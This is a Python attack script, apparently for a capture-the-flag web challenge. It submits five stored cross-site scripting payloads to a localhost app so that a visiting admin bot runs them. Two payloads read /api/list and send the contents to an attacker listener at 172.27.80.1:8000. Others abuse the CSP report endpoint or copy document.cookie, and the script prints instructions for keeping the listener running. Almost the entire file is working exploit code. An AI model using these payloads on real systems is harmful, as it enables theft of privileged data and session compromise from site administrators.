import requests
import time

# Strategy: Use the CSP report endpoint to exfiltrate data
# The bot will execute our XSS, make a request that violates CSP (if any),
# and the violation will be reported to /api/csp-report with a token parameter

# But wait - let's use a simpler approach
# Since the bot has admin cookie and accesses from 127.0.0.1,
# we can make it fetch /api/list and send the data somewhere

# Let's use different XSS payloads

payloads = [
    # Payload 1: Try to use img tag to exfiltrate (might work without CSP blocking)
    """<img src=x onerror="fetch('/api/list').then(r=>r.text()).then(d=>navigator.sendBeacon('http://172.27.80.1:8000?data='+encodeURIComponent(d)))">""",
    
    # Payload 2: Use the CSP report endpoint itself
    """<img src=x onerror="fetch('/api/list').then(r=>r.text()).then(d=>fetch('/api/csp-report?token='+encodeURIComponent(d),{method:'POST',body:JSON.stringify({'csp-report':{'blocked-uri':'test','violated-directive':'test'}})}))">""",
    
    # Payload 3: Simple alert to test if XSS works at all
    "<img src=x onerror=alert(1)>",
    
    # Payload 4: Try to set a cookie we can read
    "<img src=x onerror=\"document.cookie='stolen='+document.cookie+';domain=localhost;path=/'\">",
    
    # Payload 5: Try XML HTTP request
    """<img src=x onerror="var xhr=new XMLHttpRequest();xhr.open('GET','/api/list',false);xhr.send();new Image().src='http://172.27.80.1:8000?data='+encodeURIComponent(xhr.responseText)">"""
]

print("[+] Submitting multiple XSS payloads...")
print("[*] Your host IP appears to be: 172.27.80.1")
print("[*] Make sure listener is running on port 8000\n")

session = requests.Session()
# Get initial session
session.get('http://localhost:1337/')

for i, payload in enumerate(payloads):
    print(f"[+] Submitting payload {i+1}/{len(payloads)}")
    print(f"    Payload: {payload[:80]}...")
    
    r = session.post('http://localhost:1337/', data={'idea': payload})
    
    if r.status_code == 200:
        print(f"    ✓ Submitted successfully")
    else:
        print(f"    ✗ Failed with status {r.status_code}")
    
    time.sleep(0.5)

print(f"\n[+] All payloads submitted!")
print("[*] Now wait for bot to visit /list (~35 seconds)")
print("[*] Keep the listener running on port 8000")
print("[*] If firewall blocks, bot won't be able to connect")
print("\nAlternative: Check if any data was reported to /api/csp-report")
